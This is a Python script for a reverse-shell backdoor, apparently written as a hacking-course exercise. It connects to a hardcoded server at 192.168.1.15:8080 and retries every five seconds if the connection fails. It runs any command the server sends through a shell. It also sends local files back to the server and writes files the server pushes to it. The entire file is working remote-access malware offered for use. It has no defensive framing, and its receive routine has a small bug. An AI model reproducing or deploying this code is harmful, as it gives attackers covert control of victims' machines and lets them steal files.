from socket import socket, AF_INET, SOCK_STREAM
import json
import subprocess
import os
import base64
import time

def reliable_send(data):
    if isinstance(data, dict):
        for key, value in data.items():
            if isinstance(value, bytes):
                data[key] = base64.b64encode(value).decode('utf-8')
    elif isinstance(data, list):
        for i in range(len(data)):
            if isinstance(data[i], bytes):
                data[i] = base64.b64encode(data[i]).decode('utf-8')
    elif isinstance(data, bytes):
        data = base64.b64encode(data).decode('utf-8')

    json_data = json.dumps(data)
    client_socket.send(json_data.encode("utf-8"))

def reliable_receive():
    json_data = ""
    while True:
        json_data = json_data + client_socket.recv(1024).decode("utf-8")
        return json.loads(json_data)
        

def execute_system_command(command):
    try:
        if command[0] == "cd":
            os.chdir(command[1])
            return "[+] Changing directory to " + os.getcwd()
        command = " ".join(command)
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        return result.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8")
    
def decode_file_content(file_name, file_content):
    with open(file_name, "wb") as file:
        file.write(base64.b64decode(file_content))
        return "[+] Download successful"

def get_file_content(file_name):
    with open(file_name, "rb") as file:
        return base64.b64encode(file.read())

    
def close_connection():
    print("Connection terminated2")
    client_socket.close()

def main():
    while True:
        command = reliable_receive()
        print(command)
        if command[0] == "quit":
            print(command)
            print("Connection terminated")
            reliable_send("Connection terminated")
            close_connection()
            break

        elif command[0] == "DOWNLOAD":
            file_name = command[1]
            file_content = get_file_content(file_name)
            print(file_content)
            reliable_send(file_content)
        
        elif command[0] == "UPLOAD": #serverdan cliente dosya yükleme (serverın uploadı)
            file_name = command[1]
            file_content = command[2]
            result = decode_file_content(file_name, file_content)
            reliable_send(result)


        else:
            command_result = execute_system_command(command)
            reliable_send(command_result)


if __name__ == "__main__":
    while True:
        try:
            host = "192.168.1.15"
            port = 8080

            client_socket = socket(AF_INET, SOCK_STREAM)
            client_socket.connect((host, port))
            
            main()

        except Exception as e:
            print("error in main")
            print(e)
            time.sleep(5)
            continue
